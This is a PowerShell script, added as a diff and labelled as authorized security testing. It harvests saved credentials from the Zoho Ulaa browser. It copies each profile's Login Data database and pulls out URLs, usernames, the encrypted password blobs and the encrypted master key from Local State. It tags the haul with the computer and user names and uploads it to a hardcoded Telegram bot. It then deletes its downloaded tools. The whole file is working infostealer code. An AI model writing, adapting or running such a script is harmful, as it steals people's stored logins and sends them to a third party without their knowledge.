@@ -1,0 +1,268 @@
+# ULAA Browser Password Extraction - SHOW HASH & FIXED TELEGRAM
+# For Authorized Security Testing Only
+
+param(
+    [string]$x = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
+    [string]$y = "2047893044"
+)
+
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+# Download SQLite3 FIRST
+Write-Host "=== ULAA Browser Password Extraction ===" -ForegroundColor Green
+Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
+
+function Install-SQLiteIfNeeded {
+    try {
+        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
+        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
+        $tempZip = "sqlite-temp.zip"
+        
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
+        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
+        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
+        
+        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
+        
+        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+function Send-TelegramFile {
+    param(
+        [string]$FilePath,
+        [string]$Caption
+    )
+    
+    try {
+        if (-not (Test-Path $FilePath)) {
+            Write-Host "File not found: $FilePath" -ForegroundColor Red
+            return $false
+        }
+        
+        # Wait for file to be fully written
+        Write-Host "Waiting for file to be ready..." -ForegroundColor Yellow
+        Start-Sleep -Seconds 2
+        
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileEncoded = [System.Convert]::ToBase64String($fileBytes)
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "",
+            $y,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"caption`"",
+            "",
+            $Caption,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Type: application/octet-stream",
+            "",
+            $fileEncoded,
+            "--$boundary--"
+        ) -join $LF
+
+        $uri = "https://api.telegram.org/bot$x/sendDocument"
+        Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
+        
+        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        
+        if ($response.ok) {
+            Write-Host "File sent to Telegram successfully" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "Telegram API error: $($response.description)" -ForegroundColor Red
+            return $false
+        }
+    } catch {
+        Write-Host "Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# Download SQLite3 immediately
+if (-not (Test-Path ".\sqlite3.exe")) {
+    if (-not (Install-SQLiteIfNeeded)) {
+        Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
+        exit 1
+    }
+}
+
+# Main Execution
+$ulaaPath = "$env:LOCALAPPDATA\Zoho\Ulaa\User Data"
+Write-Host "ULAA Path: $ulaaPath" -ForegroundColor Cyan
+
+if (-not (Test-Path $ulaaPath)) {
+    Write-Host "ULAA browser data not found!" -ForegroundColor Red
+    exit 1
+}
+
+# Get master key (for reference only)
+function Get-MasterKey {
+    param([string]$ulaaPath)
+    
+    try {
+        $localStatePath = Join-Path $ulaaPath "Local State"
+        if (Test-Path $localStatePath) {
+            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+            $encryptedKey = $localState.os_crypt.encrypted_key
+            
+            if ($encryptedKey) {
+                return "Extracted: $encryptedKey"
+            }
+        }
+    } catch {
+        return "Error: $($_.Exception.Message)"
+    }
+    
+    return "Not Found"
+}
+
+Write-Host "Extracting master encryption key..." -ForegroundColor Yellow
+$masterKey = Get-MasterKey -ulaaPath $ulaaPath
+Write-Host "Master Key: $masterKey" -ForegroundColor Cyan
+
+$profiles = @("Default", "Default Developer", "Default Kids", "Default Open Season", "Default Work")
+$allCredentials = @()
+
+foreach ($profile in $profiles) {
+    $loginDataPath = "$ulaaPath\$profile\Login Data"
+    
+    if (Test-Path $loginDataPath) {
+        Write-Host "Processing $profile..." -ForegroundColor Yellow
+        
+        # Create temp database copy
+        $tempDb = "temp_$($profile -replace ' ','_').db"
+        Copy-Item $loginDataPath $tempDb -Force -ErrorAction SilentlyContinue
+        
+        # Extract data with SQLite - get the actual hex data
+        $query = @"
+SELECT 
+    origin_url, 
+    username_value, 
+    hex(password_value) as password_hex,
+    length(password_value) as password_length
+FROM logins;
+"@
+        
+        $tempCsv = "temp_$($profile -replace ' ','_').csv"
+        & .\sqlite3.exe -csv -header $tempDb $query > $tempCsv 2>$null
+        
+        if (Test-Path $tempCsv) {
+            $logins = Import-Csv $tempCsv -ErrorAction SilentlyContinue
+            $profileCount = @($logins).Count
+            
+            Write-Host "  Found $profileCount login entries" -ForegroundColor Green
+            
+            foreach ($login in $logins) {
+                $passwordHex = $login.password_hex
+                
+                # Show the actual encrypted hash - NO DECRYPTION ATTEMPTS
+                if ($passwordHex -and $passwordHex -match '^[0-9A-Fa-f]+$') {
+                    Write-Host "    Password Hash: $passwordHex" -ForegroundColor Cyan
+                    $passwordDisplay = $passwordHex
+                } else {
+                    $passwordDisplay = "[No encrypted data]"
+                }
+                
+                $credential = [PSCustomObject]@{
+                    Profile = $profile
+                    URL = $login.origin_url
+                    Username = $login.username_value
+                    Password = $passwordDisplay  # Show actual hex hash
+                    PasswordLength = $login.password_length
+                    IsDecrypted = $false
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+                
+                $allCredentials += $credential
+            }
+            
+            Remove-Item $tempCsv -Force -ErrorAction SilentlyContinue
+        }
+        
+        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# Delete downloaded SQLite3 immediately
+Write-Host "Deleting downloaded SQLite3..." -ForegroundColor Yellow
+Remove-Item ".\sqlite3.exe" -Force -ErrorAction SilentlyContinue
+Write-Host "SQLite3 deleted" -ForegroundColor Green
+
+# Save results
+$outputFile = "ULAA_Encrypted_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
+$results = @{
+    Computer = $env:COMPUTERNAME
+    User = $env:USERNAME
+    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    TotalCredentials = $allCredentials.Count
+    MasterKey = $masterKey
+    Credentials = $allCredentials
+}
+
+$results | ConvertTo-Json -Depth 4 | Out-File $outputFile -Encoding UTF8
+Write-Host "Results saved: $outputFile" -ForegroundColor Green
+
+# Wait for file to be fully written
+Write-Host "Waiting for file to be ready..." -ForegroundColor Yellow
+Start-Sleep -Seconds 3
+
+# Send Telegram report and file
+try {
+    # First send a message
+    $message = @"
+ULAA Password Extraction Complete
+Computer: $env:COMPUTERNAME
+Credentials: $($allCredentials.Count)
+Master Key: $(if($masterKey -like "Extracted*"){"Yes"}else{"No"})
+"@
+
+    $body = @{
+        chat_id = $y
+        text = $message
+    } | ConvertTo-Json
+
+    $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$x/sendMessage" -Method Post -Body $body -ContentType "application/json"
+    Write-Host "Telegram report sent" -ForegroundColor Green
+    
+    # Then send the file with proper waiting
+    if (Test-Path $outputFile) {
+        $fileInfo = Get-Item $outputFile
+        if ($fileInfo.Length -gt 0) {
+            $caption = "ULAA Results - $env:COMPUTERNAME - $($allCredentials.Count) credentials"
+            $fileSent = Send-TelegramFile -FilePath $outputFile -Caption $caption
+        } else {
+            Write-Host "File is empty, not sending to Telegram" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "Output file not found for Telegram" -ForegroundColor Red
+    }
+    
+} catch {
+    Write-Host "Telegram failed: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+# Display summary
+Write-Host "`n" + "="*60 -ForegroundColor Green
+Write-Host "EXTRACTION COMPLETE" -ForegroundColor Green
+Write-Host "="*60 -ForegroundColor Green
+Write-Host "Total credentials: $($allCredentials.Count)" -ForegroundColor Cyan
+Write-Host "Master key: $(if($masterKey -like "Extracted*"){"Extracted"}else{"Not Available"})" -ForegroundColor Cyan
+Write-Host "Output file: $outputFile" -ForegroundColor Cyan
+Write-Host "="*60 -ForegroundColor Green
+
+# Cleanup temp files
+Get-ChildItem -Path "." -Filter "temp_*.db" -ErrorAction SilentlyContinue | Remove-Item -Force
+Get-ChildItem -Path "." -Filter "temp_*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force
+
+Write-Host "`nDone! Password hashes extracted successfully." -ForegroundColor Green
